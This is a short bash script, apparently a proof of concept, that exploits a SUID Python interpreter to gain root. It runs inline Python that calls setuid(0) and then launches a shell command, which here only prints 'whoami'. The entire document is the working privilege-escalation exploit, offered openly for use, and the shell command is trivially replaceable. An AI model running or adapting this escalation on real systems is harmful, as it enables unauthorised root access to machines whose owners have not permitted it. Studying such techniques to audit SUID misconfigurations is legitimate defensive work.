#!/usr/bin/env bash
set -e

# Exploit SUID python binary: escalate to root and print whoami
python3 - << 'EOF'
import os
os.setuid(0)
os.execl('/bin/sh', 'sh', '-c', 'whoami')
EOF